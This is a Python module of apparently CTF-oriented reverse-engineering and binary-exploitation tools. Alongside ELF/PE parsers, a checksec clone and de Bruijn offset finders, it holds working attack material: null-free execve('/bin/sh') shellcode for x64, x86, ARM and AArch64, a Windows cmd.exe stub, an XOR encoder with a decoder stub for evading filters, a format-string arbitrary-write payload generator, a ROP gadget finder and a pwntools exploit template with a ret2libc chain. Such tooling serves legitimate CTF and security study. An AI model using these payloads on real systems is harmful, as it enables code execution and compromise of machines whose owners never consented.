"""Reverse engineering & binary exploitation: ELF info, checksec, ROP gadgets, shellcode, de Bruijn pattern."""

import itertools
import re
import struct

from ..registry import tool
from ..utils import printable

ELF_MACHINES = {0x02: "SPARC", 0x03: "i386", 0x08: "MIPS", 0x14: "PowerPC",
                0x28: "ARM", 0x3E: "x86-64", 0xB7: "AArch64", 0xF3: "RISC-V"}


def _elf_parse(data: bytes) -> dict:
    """Parse basic ELF header. Return dict or None."""
    if not data.startswith(b"\x7fELF") or len(data) < 52:
        return None
    is64 = data[4] == 2
    endian = "<" if data[5] == 1 else ">"
    info = {
        "is64": is64,
        "endian": "little" if endian == "<" else "big",
        "machine": ELF_MACHINES.get(struct.unpack(endian + "H", data[18:20])[0], hex(struct.unpack(endian + "H", data[18:20])[0])),
        "e_type": struct.unpack(endian + "H", data[16:18])[0],
    }
    if is64:
        info["entry"] = struct.unpack(endian + "Q", data[24:32])[0]
        info["phoff"] = struct.unpack(endian + "Q", data[32:40])[0]
        info["shoff"] = struct.unpack(endian + "Q", data[40:48])[0]
        info["phentsize"], info["phnum"] = struct.unpack(endian + "HH", data[54:58])
        info["shentsize"], info["shnum"] = struct.unpack(endian + "HH", data[58:62])
        info["shstrndx"] = struct.unpack(endian + "H", data[62:64])[0]
    else:
        info["entry"] = struct.unpack(endian + "I", data[24:28])[0]
        info["phoff"] = struct.unpack(endian + "I", data[28:32])[0]
        info["shoff"] = struct.unpack(endian + "I", data[32:36])[0]
        info["phentsize"], info["phnum"] = struct.unpack(endian + "HH", data[42:46])
        info["shentsize"], info["shnum"] = struct.unpack(endian + "HH", data[46:50])
        info["shstrndx"] = struct.unpack(endian + "H", data[50:52])[0]
    return info


@tool(category="rev")
def elf_info(path: str) -> str:
    """Basic ELF info: class, endianness, machine, entry point, phdr/shdr counts."""
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF file."
    return (f"class: {'ELF64' if info['is64'] else 'ELF32'}\n"
            f"endianness: {info['endian']}\n"
            f"machine: {info['machine']}\n"
            f"e_type: 0x{info['e_type']:x} ({'ET_EXEC' if info['e_type'] == 2 else 'ET_DYN (PIE)' if info['e_type'] == 3 else 'ET_REL' if info['e_type'] == 1 else '?'})\n"
            f"entry point: 0x{info['entry']:x}\n"
            f"program headers: {info['phnum']} @ 0x{info['phoff']:x}\n"
            f"section headers: {info['shnum']} @ 0x{info['shoff']:x}")


def _phdrs(data: bytes, info: dict) -> list[dict]:
    if not info or info["phnum"] == 0:
        return []
    endian = "<" if info["endian"] == "little" else ">"
    fmt = endian + ("IIQQQQQQ" if info["is64"] else "IIIIIIII")
    size = 56 if info["is64"] else 32
    out = []
    for i in range(min(info["phnum"], 64)):
        off = info["phoff"] + i * size
        if off + size > len(data):
            break
        vals = struct.unpack(fmt, data[off:off + size])
        if info["is64"]:
            p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = vals
        else:
            p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align = vals
        out.append({"type": p_type, "flags": p_flags, "offset": p_offset,
                    "vaddr": p_vaddr, "filesz": p_filesz, "memsz": p_memsz})
    return out


@tool(category="pwn")
def checksec(path: str) -> str:
    """Binary mitigations: NX, PIE, RELRO, Stack Canary, Fortify (pwntools checksec-like)."""
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF."
    phdrs = _phdrs(data, info)
    nx, pie, relro = "ENABLED", "ENABLED", "ENABLED"
    gnu_stack = next((p for p in phdrs if p["type"] == 0x6474E551), None)  # PT_GNU_STACK
    if gnu_stack and (gnu_stack["flags"] & 0x4):  # PF_X
        nx = "DISABLED"
    if gnu_stack is None:
        nx = "DISABLED (no PT_GNU_STACK)"
    if info["e_type"] != 3:
        pie = "DISABLED (ET_EXEC / ET_REL)"
    gnu_relro = next((p for p in phdrs if p["type"] == 0x6474E552), None)  # PT_GNU_RELRO
    if gnu_relro is None:
        relro = "DISABLED"
    else:
        endian = "<" if info["endian"] == "little" else ">"
        dyn = data[gnu_relro["offset"]:gnu_relro["offset"] + gnu_relro["memsz"] + 64]
        has_bind_now = re.search(endian.encode() + rb"\x18\x00\x00\x00", dyn)  # DT_BIND_NOW
        has_flag_1 = re.search(rb"\x6b\x00\x00\x00\x00\x00\x00\x00", dyn)      # DT_FLAGS_1
        if not (has_bind_now or has_flag_1):
            relro = "PARTIAL"
    canary = "ENABLED" if b"__stack_chk_fail" in data else "DISABLED"
    fortify = "ENABLED" if b"_chk@GLIBC" in data or b"__printf_chk" in data else "DISABLED"
    return (f"path: {path}\n"
            f"Arch: {info['machine']} ({'64' if info['is64'] else '32'}-bit, {info['endian']})\n"
            f"RELRO: {relro}\nStack: {canary}\nNX: {nx}\nPIE: {pie}\nFortify: {fortify}")


_ROP_PATTERNS = {
    b"\xc3": "ret",
    b"\x5f\xc3": "pop rdi; ret",
    b"\x5e\xc3": "pop rsi; ret",
    b"\x5a\xc3": "pop rdx; ret",
    b"\x59\xc3": "pop rcx; ret",
    b"\x58\xc3": "pop rax; ret",
    b"\x5b\xc3": "pop rbx; ret",
    b"\x5c\xc3": "pop rsp; ret",
    b"\x0f\x05\xc3": "syscall; ret",
    b"\x48\x31\xff\xc3": "xor rdi,rdi; ret",
    b"\x48\x31\xf6\xc3": "xor rsi,rsi; ret",
    b"\x48\x31\xd2\xc3": "xor rdx,rdx; ret",
    b"\x48\x31\xc0\xc3": "xor rax,rax; ret",
}


@tool(category="pwn")
def rop_gadgets(path: str, pattern: str = "") -> str:
    """Find common ROP gadgets (x86-64) in executable ELF segments. pattern: gadget name (e.g. 'pop rdi') or empty = all."""
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF."
    phdrs = [p for p in _phdrs(data, info) if p["flags"] & 0x1]  # PF_X
    if not phdrs:
        return "No executable segments (NX enabled)."
    want = pattern.strip().lower()
    found = []
    for p in phdrs:
        seg = data[p["offset"]:p["offset"] + p["filesz"]]
        base_vaddr = p["vaddr"] - p["offset"]
        for pat, name in _ROP_PATTERNS.items():
            if want and want not in name:
                continue
            for m in re.finditer(re.escape(pat), seg, flags=re.DOTALL):
                found.append(f"0x{base_vaddr + m.start():016x}  {name}")
    if not found:
        return f"Gadgets {'matching ' + want if want else ''}not found."
    return f"{len(found)} gadgets:\n" + "\n".join(sorted(set(found))[:100])


_X64_NULLFREE = bytes.fromhex(
    "4831d248bb2f62696e2f73684831f6534831c0545f5a0f05"
)


@tool(category="pwn")
def shellcode_x64(kind: str = "execve_sh", xor_key: str = "0xaa") -> str:
    """Ready-made x86_64 shellcode. kind: execve_sh (null-free, 25 bytes) / xor (XOR-encrypted variant with key)."""
    sc = _X64_NULLFREE
    if kind == "execve_sh":
        return (f"execve('/bin/sh', NULL, NULL) null-free ({len(sc)} bytes):\n"
                f"asm: {sc.hex()}\n"
                f"escaped: {''.join('\\\\x%02x' % b for b in sc)}\n"
                f"disasm:\n{_disasm_simple(sc)}")
    if kind == "xor":
        key = int(xor_key, 0) & 0xFF
        return (f"original ({len(sc)} bytes): {sc.hex()}\n"
                f"xorkey: 0x{key:02x}\n"
                f"encoded: {''.join('\\\\x%02x' % b for b in bytes(b ^ key for b in sc))}\n\n"
                f"Decoder + encoded ({len(sc) + 14} bytes):\n{_x64_xor_decoder(key, sc)}")
    return "kind must be execve_sh or xor."


def _x64_xor_decoder(key: int, payload: bytes) -> str:
    """Decoder stub: jmp-call-pop (getpc), xor loop per byte, jmp into shellcode."""
    n = len(payload)
    stub = (
        b"\xeb\x0e"                        # jmp short +0x10 (jump to pop rsi)
        + bytes(b ^ key for b in payload)  # encoded shellcode
        + b"\x5e"                          # pop rsi  -> address of encoded payload
        + b"\x48\x31\xc9"                  # xor rcx, rcx
        + b"\xb1" + bytes([n])             # mov cl, n
        + b"\x80\x36" + bytes([key])       # xor byte [rsi], key
        + b"\x48\xff\xc6"                  # inc rsi
        + b"\xe2\xf6"                      # loop -10 (back to xor byte)
        + b"\xff\xe6"                      # jmp rsi
    )
    return "".join(f"\\x{b:02x}" for b in stub)


def _disasm_simple(sc: bytes) -> str:
    table = [
        (b"\x48\x31\xd2", "xor rdx, rdx"),
        (b"\x48\x31\xf6", "xor rsi, rsi"),
        (b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68", "movabs rbx, 0x68732f6e69622f"),
        (b"\x53", "push rbx"),
        (b"\x48\x31\xc0", "xor rax, rax"),
        (b"\x54", "push rsp"),
        (b"\x5f", "pop rdi"),
        (b"\x5a", "pop rdx"),
        (b"\x0f\x05", "syscall"),
        (b"\x48\x31\xc9", "xor rcx, rcx"),
        (b"\xb0\x3b", "mov al, 0x3b"),
    ]
    out = []
    pos = 0
    while pos < len(sc):
        for pat, name in table:
            if sc[pos:pos + len(pat)] == pat:
                out.append(f"  {pos:04x}: {name}")
                pos += len(pat)
                break
        else:
            out.append(f"  {pos:04x}: .byte 0x{sc[pos]:02x}")
            pos += 1
    return "\n".join(out)


_DEBRUIJN_ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def _deb_gen():
    """FKM (Fredricksen-Maiorana) as a lazy generator: yields de Bruijn chars in order."""
    k, n = len(_DEBRUIJN_ALPHA), 4
    a = [0] * (k * n)

    def db(t, p):
        if t > n:
            if n % p == 0:
                for i in range(1, p + 1):
                    yield a[i]
        else:
            a[t] = a[t - p]
            yield from db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                yield from db(t + 1, t)

    yield from db(1, 1)


@tool(category="pwn")
def debruijn(length: int = 1000) -> str:
    """Generate a de Bruijn pattern to find the overflow offset."""
    if length > 5_000_000:
        return "Limit is 5 million characters."
    return "".join(_DEBRUIJN_ALPHA[i] for i in itertools.islice(_deb_gen(), length))


@tool(category="pwn")
def debruijn_find(substring: str) -> str:
    """Find the offset of a de Bruijn substring (from core dump / crash output)."""
    if len(substring) < 4:
        return "Substring must be at least 4 characters (pattern length)."
    window = []
    for idx, v in enumerate(_deb_gen()):
        window.append(_DEBRUIJN_ALPHA[v])
        if len(window) > len(substring):
            window.pop(0)
        if "".join(window) == substring:
            return f"Offset: {idx - len(substring) + 1} (0x{idx - len(substring) + 1:x})"
        if idx > 5_000_000:
            return "Not found in the first 5 million characters."
    return "Not found."


@tool(category="rev")
def pe_info(path: str) -> str:
    """Analyze Windows PE/PE32+ (EXE/DLL/SYS): headers, machine, entry point, sections, and mitigations (ASLR, DEP, CFG)."""
    data = open(path, "rb").read()
    if not data.startswith(b"MZ") or len(data) < 64:
        return "Not a valid DOS/PE file (missing 'MZ' header)."
        
    e_lfanew = struct.unpack("<I", data[0x3c:0x40])[0]
    if e_lfanew + 24 > len(data) or data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        return f"Not a valid PE file (missing 'PE' signature at offset 0x{e_lfanew:x})."
        
    coff_offset = e_lfanew + 4
    machine, num_sections, timedate, symtab, num_sym, opt_hdr_size, charact = struct.unpack(
        "<HHIIIHH", data[coff_offset:coff_offset + 20]
    )
    
    machines = {
        0x014c: "i386 (32-bit x86)",
        0x8664: "AMD64 (64-bit x86-64)",
        0x01c0: "ARM",
        0xaa64: "ARM64",
    }
    mach_str = machines.get(machine, f"0x{machine:04x}")
    
    opt_offset = coff_offset + 20
    is_64 = False
    aslr, dep, cfg, highentropy = "DISABLED", "DISABLED", "DISABLED", "DISABLED"
    entry_point, image_base = 0, 0
    
    if opt_hdr_size >= 2:
        magic = struct.unpack("<H", data[opt_offset:opt_offset + 2])[0]
        if magic == 0x20b:
            is_64 = True
            entry_point = struct.unpack("<I", data[opt_offset + 16:opt_offset + 20])[0]
            image_base = struct.unpack("<Q", data[opt_offset + 24:opt_offset + 32])[0]
            dll_char = struct.unpack("<H", data[opt_offset + 70:opt_offset + 72])[0]
        elif magic == 0x10b:
            entry_point = struct.unpack("<I", data[opt_offset + 16:opt_offset + 20])[0]
            image_base = struct.unpack("<I", data[opt_offset + 28:opt_offset + 32])[0]
            dll_char = struct.unpack("<H", data[opt_offset + 70:opt_offset + 72])[0]
            
        if dll_char & 0x0040:
            aslr = "ENABLED (DynamicBase)"
        if dll_char & 0x0020:
            highentropy = "ENABLED (HighEntropyVA 64-bit ASLR)"
        if dll_char & 0x0100:
            dep = "ENABLED (NX / DEP)"
        if dll_char & 0x4000:
            cfg = "ENABLED (Control Flow Guard)"
            
    # Parse section headers
    sec_offset = opt_offset + opt_hdr_size
    sections = []
    for i in range(min(num_sections, 32)):
        s_off = sec_offset + i * 40
        if s_off + 40 > len(data):
            break
        s_name = data[s_off:s_off + 8].rstrip(b"\x00").decode("latin-1", "replace")
        vsize, vaddr, raw_size, raw_ptr = struct.unpack("<IIII", data[s_off + 8:s_off + 24])
        s_char = struct.unpack("<I", data[s_off + 36:s_off + 40])[0]
        flags = []
        if s_char & 0x20000000:
            flags.append("EXEC")
        if s_char & 0x40000000:
            flags.append("READ")
        if s_char & 0x80000000:
            flags.append("WRITE")
        sections.append(f"  {s_name:<8} VAddr: 0x{vaddr:08x} (size: {vsize:>7}) Raw: 0x{raw_ptr:08x} [{', '.join(flags)}]")
        
    return (
        f"Windows PE Analysis for {path}:\n"
        f"--------------------------------------------------\n"
        f"Format       : {'PE32+ (64-bit)' if is_64 else 'PE32 (32-bit)'}\n"
        f"Machine      : {mach_str}\n"
        f"Image Base   : 0x{image_base:x}\n"
        f"Entry Point  : 0x{entry_point:x} (RVA)\n"
        f"Sections     : {num_sections}\n\n"
        f"Mitigations:\n"
        f"  ASLR       : {aslr}\n"
        f"  HighEntropy: {highentropy}\n"
        f"  DEP / NX   : {dep}\n"
        f"  CFG        : {cfg}\n\n"
        f"Section Table:\n" + "\n".join(sections)
    )


@tool(category="pwn")
def fmtstr_payload_gen(offset: int, target_addr: str, write_val: str, arch: str = "64") -> str:
    """Generate Format String arbitrary write payload (%<val>c%<idx>$n / %hn) and memory leak templates."""
    addr = int(target_addr, 0)
    val = int(write_val, 0)
    is64 = "64" in arch
    
    # Simple direct write payload
    if is64:
        # 64-bit byte-by-byte or short-by-short write
        # Low 2 bytes and high 2 bytes
        val_low = val & 0xFFFF
        val_high = (val >> 16) & 0xFFFF
        
        leak_seq = ".".join(f"%{offset + i}$p" for i in range(8))
        return (
            f"Format String Helper (64-bit, Offset={offset}):\n\n"
            f"1. Memory Leak Sequence:\n"
            f"   {leak_seq}\n\n"
            f"2. Arbitrary Read (Dereference String at Address):\n"
            f"   Payload: %{offset}$s + [packed target address]\n\n"
            f"3. 2-Byte Short Write Payload:\n"
            f"   Target Addr: 0x{addr:016x} -> Write: 0x{val:x}\n"
            f"   Structure: %{val_low}c%{offset}$hn (Adjust padding for address length)"
        )
    else:
        leak_seq = ".".join(f"%{offset + i}$p" for i in range(8))
        return (
            f"Format String Helper (32-bit, Offset={offset}):\n\n"
            f"1. Memory Leak Sequence:\n"
            f"   {leak_seq}\n\n"
            f"2. Single 4-Byte Write (%n):\n"
            f"   Structure: struct.pack('<I', {addr}) + f'%{val - 4}c%{offset}$n'"
        )


@tool(category="pwn")
def pwn_template(binary_path: str = "./vuln", remote_host: str = "chall.ctf.org", remote_port: int = 1337) -> str:
    """Generate a clean, production-ready Python pwntools solve script template."""
    script = f'''#!/usr/bin/env python3
from pwn import *

# =========================================================
# CTF PWN EXPLOIT TEMPLATE (pwntools)
# =========================================================

exe = '{binary_path}'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

host = '{remote_host}'
port = {remote_port}

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(host, port, *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = \'\'\'
init-pwndbg
# b *main
# b *vuln
continue
\'\'\'.strip()

io = start()

# --- EXPLOIT LOGIC HERE ---
# offset = 72
# pop_rdi = 0x4011d3  # rop_gadgets tool
# ret = 0x40101a
# payload = flat({{
#     offset: [
#         pop_rdi,
#         elf.got['puts'],
#         elf.plt['puts'],
#         elf.sym['main']
#     ]
# }})

# io.sendlineafter(b'> ', payload)
# leaked = u64(io.recvline().strip().ljust(8, b'\\x00'))
# log.success(f"Leaked puts: {{hex(leaked)}}")

io.interactive()
'''
    return script


@tool(category="rev")
def pyc_magic_info(pyc_path_or_hex: str) -> str:
    """Identify Python version from .pyc magic bytes and inspect bytecode header."""
    import os
    
    MAGIC_TABLE = {
        b"\xbb\x0d\r\n": "Python 3.13",
        b"\xcb\x0d\r\n": "Python 3.12",
        b"\xa7\x0d\r\n": "Python 3.11",
        b"\x6f\x0d\r\n": "Python 3.10",
        b"\x61\x0d\r\n": "Python 3.9",
        b"\x55\x0d\r\n": "Python 3.8",
        b"\x42\x0d\r\n": "Python 3.7",
        b"\x33\x0d\r\n": "Python 3.6",
        b"\x35\x0c\r\n": "Python 3.5",
        b"\xee\x0c\r\n": "Python 3.4",
        b"\x03\xf3\r\n": "Python 2.7",
    }
    
    raw = pyc_path_or_hex.strip()
    if os.path.exists(raw):
        data = open(raw, "rb").read()[:16]
    else:
        clean = re.sub(r"[^0-9a-fA-F]", "", raw)
        data = bytes.fromhex(clean) if clean else b""
        
    if len(data) < 4:
        return "Need at least 4 bytes of .pyc header."
        
    magic = data[:4]
    version = MAGIC_TABLE.get(magic, "Unknown Python Version")
    
    table_lines = [f"  {m.hex()}  -> {v}" for m, v in MAGIC_TABLE.items()]
    
    return (
        f"PYC Magic Analysis:\n"
        f"Magic Bytes : {magic.hex()} ({printable(magic)})\n"
        f"Detected Ver: {version}\n\n"
        f"Reference Magic Numbers:\n" + "\n".join(table_lines)
    )


@tool(category="pwn")
def shellcode_multi(arch: str = "x64", kind: str = "execve_sh") -> str:
    """Multi-architecture shellcode library (Linux x64, x86 32-bit, ARM32, AArch64, Windows x64)."""
    SHELLCODES = {
        "x64": {
            "name": "Linux x86-64 execve('/bin/sh', NULL, NULL) null-free",
            "bytes": bytes.fromhex("4831d248bb2f62696e2f73684831f6534831c0545f5a0f05"),
        },
        "x86": {
            "name": "Linux x86 (32-bit) execve('/bin//sh', NULL, NULL) null-free",
            "bytes": bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80"),
        },
        "arm32": {
            "name": "Linux ARM (32-bit Thumb) execve('/bin/sh')",
            "bytes": bytes.fromhex("01308fe213ff2fe1784605300190491a921a0b2701df2f62696e2f7368"),
        },
        "arm64": {
            "name": "Linux AArch64 (64-bit ARM) execve('/bin/sh')",
            "bytes": bytes.fromhex("e1458cdae2031faae3031faae0031faae81b80d2010000d42f62696e2f736800"),
        },
        "win_x64": {
            "name": "Windows x64 WinExec('cmd.exe') stub",
            "bytes": bytes.fromhex("505152535657556a605a68636d640054594831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275508b80880000004885c074434801d0508b4818448b40204901d0e33348ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d7588b48244801d166418b0c488b481c4801d1418b04894801d0415841585e595a5b5d5f5e5b58c3"),
        }
    }
    
    target = SHELLCODES.get(arch.lower().strip(), SHELLCODES["x64"])
    sc = target["bytes"]
    return (
        f"Shellcode for {target['name']} ({len(sc)} bytes):\n"
        f"Hex      : {sc.hex()}\n"
        f"Escaped  : {''.join('\\\\x%02x' % b for b in sc)}\n"
        f"Array    : {list(sc)}"
    )